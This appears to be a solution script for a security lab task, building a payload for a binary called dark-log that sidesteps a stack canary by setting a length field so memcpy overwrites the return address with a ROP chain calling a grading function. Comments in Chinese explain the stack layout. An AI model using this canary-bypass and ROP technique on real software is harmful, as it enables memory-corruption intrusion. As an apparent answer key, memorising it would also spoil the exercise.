#!/usr/bin/env python3
"""Task 4: bypass the stack canary in attack/dark-log."""
import sys
import struct

p32 = lambda v: struct.pack("<I", v)
p64 = lambda v: struct.pack("<Q", v)

RET = 0x4018A4          # ret
POP_RDI_RET = 0x4018A3  # pop rdi; ret
GRADE_EVAL = 0x401677

# input(): expression[128] 在 rbp-0x120，logMsg[128] 在 rbp-0xa0，len 在 rbp-0x20，
# canary 在 rbp-0x8。gets 最多只能写到 rbp-0x8 之前，不能碰 canary。
# 但 memcpy(logMsg + len, expression, 128) 的 len 由我们控制：
# 令 len = 0xa8，目标就是 rbp+8，正好把 expression 的前 128 字节复制到返回地址及更高处，
# 从而在不修改 canary 的情况下写入 ROP 链。
chain = p64(RET) + p64(POP_RDI_RET) + p64(4) + p64(GRADE_EVAL) + p64(0)

body = chain + b"A" * (0x100 - len(chain))
body += p32(0xA8)                      # f.len = 0xa8
body += b"B" * (0x108 - len(body))     # 停在 canary 之前

sys.stdout.buffer.write(body + b"\n")
